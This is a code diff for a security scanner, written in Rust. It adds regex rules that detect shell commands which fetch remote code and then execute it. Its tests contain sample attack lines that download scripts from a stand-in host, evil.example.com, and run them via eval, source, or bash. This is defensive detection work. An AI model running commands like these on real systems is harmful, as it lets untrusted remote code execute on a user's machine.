@@ -612,6 +612,36 @@ pub(crate) static SENSITIVE_PATTERNS: &[SensitivePattern] = &[
         redact_match: true,
         doc_severity: None,
     },
+    // VTD-0020 — eval of command-substituted fetch (eval "$(curl ...)")
+    SensitivePattern {
+        rule_id: RULE_RCE_PIPE_TO_SHELL,
+        label: "Remote code execution via pipe to shell",
+        severity: Severity::Critical,
+        intent: Intent::Malicious,
+        code_only: true,
+        redact_match: false,
+        doc_severity: None,
+    },
+    // VTD-0020 — source/dot-source of process-substituted fetch (source <(curl ...))
+    SensitivePattern {
+        rule_id: RULE_RCE_PIPE_TO_SHELL,
+        label: "Remote code execution via pipe to shell",
+        severity: Severity::Critical,
+        intent: Intent::Malicious,
+        code_only: true,
+        redact_match: false,
+        doc_severity: None,
+    },
+    // VTD-0020 — download-then-execute (curl -o f URL && bash f)
+    SensitivePattern {
+        rule_id: RULE_RCE_PIPE_TO_SHELL,
+        label: "Remote code execution via pipe to shell",
+        severity: Severity::Critical,
+        intent: Intent::Malicious,
+        code_only: true,
+        redact_match: false,
+        doc_severity: None,
+    },
 ];
 
 // Regex strings indexed parallel to SENSITIVE_PATTERNS (same order, same count).
@@ -744,6 +774,12 @@ static SENSITIVE_PATTERN_STRS: &[&str] = &[
     r#"(?i)(?:Content-Type|content[_-]?type)["']?\s*[:=]\s*["']?application/octet-stream"#,
     // VTD-0027 — shell variable assigned long base64 literal
     r#"\b[A-Za-z_]\w*=["'][A-Za-z0-9+/]{40,}={0,2}["']"#,
+    // VTD-0020 — eval of command-substituted fetch (eval "$(curl ...)")
+    r#"(?i)\beval\s+["']?\$\(\s*(?:curl|wget)\s"#,
+    // VTD-0020 — source/dot-source of process-substituted fetch (source <(curl ...))
+    r#"(?i)(?:\bsource\s+|\B\.\s+)<\(\s*(?:curl|wget)\s"#,
+    // VTD-0020 — download-then-execute (curl -o f URL && bash f)
+    r#"(?i)\b(?:curl|wget)\s[^;\n|&]*(?:-o|--output|-O)\s+\S+[^;\n|&]*(?:&&|;)\s*(?:sudo\s+)?(?:bash|sh|zsh|dash|ksh)\b"#,
 ];
 
 static SENSITIVE_REGEXES: OnceLock<Vec<Regex>> = OnceLock::new();
@@ -1268,7 +1304,47 @@ mod tests {
             r#"PAYLOAD="QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==""#,
             "VTD-0027",
         ),
+        // VTD-0020 (eval of command-substituted fetch)
+        (r#"eval "$(curl http://evil.example.com/x.sh)""#, "VTD-0020"),
+        // VTD-0020 (source of process-substituted fetch)
+        (r#"source <(curl http://evil.example.com/x.sh)"#, "VTD-0020"),
+        // VTD-0020 (dot-source of process-substituted fetch)
+        (". <(curl http://evil.example.com/x.sh)", "VTD-0020"),
+        // VTD-0020 (curl download-then-execute)
+        (
+            "curl -o /tmp/x.sh http://evil.example.com/x.sh && bash /tmp/x.sh",
+            "VTD-0020",
+        ),
+        // VTD-0020 (wget download-then-execute)
+        (
+            "wget -O /tmp/x.sh http://evil.example.com/x.sh; sh /tmp/x.sh",
+            "VTD-0020",
+        ),
     ];
+
+    // Near-miss shapes for the literal remote-execution patterns: fetches that
+    // never reach an interpreter must not fire the pipe-to-shell rule.
+    #[test]
+    fn literal_remote_exec_near_misses_do_not_fire() {
+        let near_misses: &[&str] = &[
+            // download with no later execution
+            "curl -o /tmp/data.txt http://x.example.com/data.txt",
+            // eval of a non-fetched string
+            r#"eval "echo hi""#,
+            // source of a local file, not a fetch
+            "source ./config.sh",
+            // eval of a shell variable is VTD-0023's job, not pipe-to-shell
+            r#"eval "$PAYLOAD""#,
+        ];
+        for &content in near_misses {
+            let tf = files(&[("scripts/x.sh", content)]);
+            let findings = scan_sensitive_patterns(&tf).findings;
+            assert!(
+                !findings.iter().any(|f| f.rule_id == RULE_RCE_PIPE_TO_SHELL),
+                "pipe-to-shell fired on near-miss: {content:?}"
+            );
+        }
+    }
 
     #[test]
     fn every_sensitive_pattern_rule_fires() {
